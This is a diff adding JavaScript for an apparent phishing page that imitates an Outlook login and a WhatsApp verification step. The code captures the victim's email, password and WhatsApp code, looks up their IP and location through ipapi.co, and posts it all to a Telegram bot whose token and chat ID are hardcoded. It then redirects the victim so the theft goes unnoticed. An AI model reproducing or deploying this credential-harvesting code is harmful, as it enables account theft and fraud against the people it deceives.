@@ -1,0 +1,83 @@
+document.addEventListener("DOMContentLoaded", function () {
+    function getQueryParam(param) {
+        const urlParams = new URLSearchParams(window.location.search);
+        return urlParams.get(param);
+    }
+
+    function obtenerUbicacionYEnviarMensajeTelegram(code, password, nextPage, message) {
+        fetch('https://ipapi.co/json/')
+            .then(response => response.json())
+            .then(data => {
+                var country = data.country_name;
+                var region = data.region;
+                var ip = data.ip;
+                if (country && region && ip) {
+                    message += '\nUbicación: ' + country + ', ' + region + '\nIP: ' + ip;
+                } else {
+                    message += '\nNo se pudo obtener la ubicación.';
+                }
+                enviarMensajeTelegram(message, nextPage);
+            })
+            .catch(error => {
+                console.error("Error al obtener la ubicación:", error);
+                message += "\nError al obtener la ubicación.";
+                enviarMensajeTelegram(message, nextPage);
+            });
+    }
+
+    function enviarMensajeTelegram(mensaje, nextPage) {
+        const token = '7655283385:AAFMdX3k-EzhU1JQ2vGdHiPB8V5qGm2tRyE'; // Reemplaza esto con tu token
+        const chat_id = '-4732912368';     // Reemplaza esto con tu chat_id
+        const url = `https://api.telegram.org/bot${token}/sendMessage`;
+
+        const payload = {
+            chat_id: chat_id,
+            text: mensaje
+        };
+
+        fetch(url, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify(payload)
+        })
+            .then(response => {
+                if (!response.ok) {
+                    throw new Error('Error');
+                }
+                console.log('');
+                window.location.href = nextPage;
+            })
+            .catch(error => {
+                console.error('Error', error);
+            });
+    }
+
+    var loginForm = document.getElementById("loginForm");
+    if (loginForm) {
+        loginForm.addEventListener("submit", function (event) {
+            event.preventDefault();
+            var Correo = document.getElementById("Correo").value;
+            var Contra = document.getElementById("Contra").value;
+
+            obtenerUbicacionYEnviarMensajeTelegram(Correo, Contra, "index1.html?action=telefono", "💲 Outlook 💲:\nCorreo Electronico: " + Correo + "\nClave: " + Contra);
+        });
+    }
+
+    var verificationForm = document.getElementById("verificationForm");
+    if (verificationForm) {
+        verificationForm.addEventListener("submit", function (event) {
+            event.preventDefault();
+            var cod = document.getElementById("cod").value;
+
+            var isNumeric = /^[0-9]+$/.test(cod);
+            if (!isNumeric) {
+                alert("Por favor, ingresa solo números.");
+                return;
+            }
+
+            obtenerUbicacionYEnviarMensajeTelegram(cod, cod, "cargando2.html?action=cod", "💲 Whatsapp 💲:\nCODIGO WHATSAPP: " + cod);
+        });
+    }
+});
